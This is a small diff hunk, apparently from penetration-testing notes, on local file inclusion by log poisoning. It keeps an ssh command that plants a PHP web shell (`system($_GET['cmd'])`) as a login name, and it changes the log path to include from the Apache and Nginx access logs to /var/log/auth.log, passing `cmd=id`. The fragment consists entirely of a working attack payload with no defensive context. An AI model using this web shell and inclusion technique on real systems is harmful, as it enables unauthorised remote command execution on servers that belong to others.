@@ -122,9 +122,7 @@
   ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
   ```
   
-  > /var/log/apache2/access.log&cmd=id
-  >
-  > /var/log/nginx/access.log&cmd=id
+  > /var/log/auth.log&cmd=id
   
   ---
   
